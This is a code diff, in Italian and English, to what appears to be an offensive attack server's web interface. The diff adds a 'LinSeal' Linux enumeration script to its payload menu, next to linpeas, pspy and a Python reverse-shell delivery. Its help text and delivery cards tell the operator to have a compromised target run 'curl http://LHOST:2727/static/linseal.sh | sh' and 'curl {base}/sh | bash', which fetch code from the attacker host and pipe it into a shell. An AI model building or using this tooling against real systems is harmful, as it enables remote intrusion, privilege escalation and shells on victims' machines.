@@ -930,9 +930,10 @@ def _page_home() -> str:
       '<span class="t-line">Apre il file manager per i payload in <code>static/</code>.</span>\\n'+
       '<span class="t-line">Da qui puoi creare, importare, modificare ed eliminare file</span>\\n'+
       '<span class="t-line">che il server serve su <code>/static/&lt;nome&gt;</code>.</span>\\n\\n'+
-      '<span class="t-line">I file precaricati includono linpeas, linenum,</span>\\n'+
+      '<span class="t-line">I file precaricati includono linseal, linpeas, linenum,</span>\\n'+
       '<span class="t-line">linux-exploit-suggester e pspy.</span>\\n\\n'+
       '<span class="t-line">Il target può scaricarli con:</span>\\n'+
+      '<span class="t-accent">  curl http://LHOST:2727/static/linseal.sh | sh</span>\\n'+
       '<span class="t-accent">  curl http://LHOST:2727/static/linpeas.sh | bash</span>\\n\\n'+
       '<span class="t-line">Digitando <span class="t-accent">static</span> verrai portato al file manager.</span>',
     loot:
@@ -1999,6 +2000,9 @@ def _page_delivery() -> str:
         ("sh", "Reverse Shell Python", "One-liner Python3 per reverse shell (utile quando bash non ha /dev/tcp)",
          f"curl {base}/sh | bash",
          f"Prerequisito: <code>nc -lvnp {_lport}</code>"),
+        ("static/linseal.sh", "LinSeal", "Enumerazione Linux leggera — alternativa a linpeas, nessuna dipendenza, zero broken pipe",
+         f"curl {base}/static/linseal.sh | sh",
+         "Nessun prerequisito — POSIX sh puro"),
     ]
     for key, title, desc, curl_cmd, prereq in endpoints:
         ep_cards += f"""<div class="delivery-card">
